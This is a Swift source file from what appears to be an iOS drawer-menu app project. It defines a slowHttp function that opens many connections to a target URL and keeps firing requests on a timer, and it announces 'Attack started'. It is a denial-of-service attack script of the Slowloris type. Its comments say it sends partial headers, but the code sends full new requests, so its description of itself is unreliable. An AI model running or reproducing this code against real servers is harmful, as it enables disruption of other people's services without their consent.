//
//  SlowHttp.swift
//  Drawer Menu App
//
//  Created by ThawDeZin on 13/10/2023.
//

import Alamofire
import Foundation

func slowHttp(url: String, connections: Int, delay: Int) {
    // Create an array of request objects that send partial headers to the target URL
    let requests = (0..<connections).map { _ in
        AF.request(url, method: .get, headers: ["User-Agent": "SlowHTTP"])
    }
    
    // Loop through the request objects
    for request in requests {
        // Start the request
        request.resume()
        
        // Send a header every delay seconds to keep the connection alive
        Timer.scheduledTimer(withTimeInterval: TimeInterval(delay), repeats: true) { timer in
            // Create a new request with the modified header
            let modifiedRequest = AF.request(url, method: .get, headers: ["User-Agent": "SlowHTTP", "X-a": "b"])
            
            // Start the new request
            modifiedRequest.resume()
            
            // Print a message to indicate the progress
            print("Sent a header \(request)")
            
            // Stop the timer if the original request is canceled or completed
            if request.isCancelled || request.isFinished {
                timer.invalidate()
            }
        }
    }
    
    // Print a message to indicate the start of the attack
    print("Attack started")
}

